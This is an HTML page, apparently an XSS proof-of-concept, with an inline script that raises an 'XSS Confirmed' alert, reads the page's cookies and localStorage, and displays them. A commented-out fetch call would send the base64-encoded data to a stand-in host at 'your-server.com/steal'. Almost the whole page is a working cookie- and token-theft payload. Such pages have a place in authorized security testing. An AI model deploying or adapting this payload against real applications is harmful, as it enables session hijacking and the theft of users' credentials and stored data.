<!DOCTYPE html>
<html>
<head>
    <title>Security Test</title>
</head>
<body>
    <h1>JavaScript Execution Confirmed</h1>
    <div id="output">Scanning for data...</div>

    <script>
        // 1. PROOF OF EXECUTION (The "Alert")
        // This proves JavaScript runs in the app context.
        alert("XSS Confirmed: JavaScript executing in Trusted Context");

        // 2. PROOF OF DATA ACCESS (The "Exfiltration")
        // This checks if we can steal cookies or tokens.
        var cookies = document.cookie;
        var storage = JSON.stringify(localStorage);
        
        var message = "Cookies: " + (cookies || "None") + "<br>Storage: " + (storage || "None");
        
        document.getElementById("output").innerHTML = message;

        // 3. REPORTING BACK (Optional)
        // If you want to prove you can send this data to a server:
        // fetch('https://your-server.com/steal?data=' + btoa(message));
    </script>
</body>
</html>
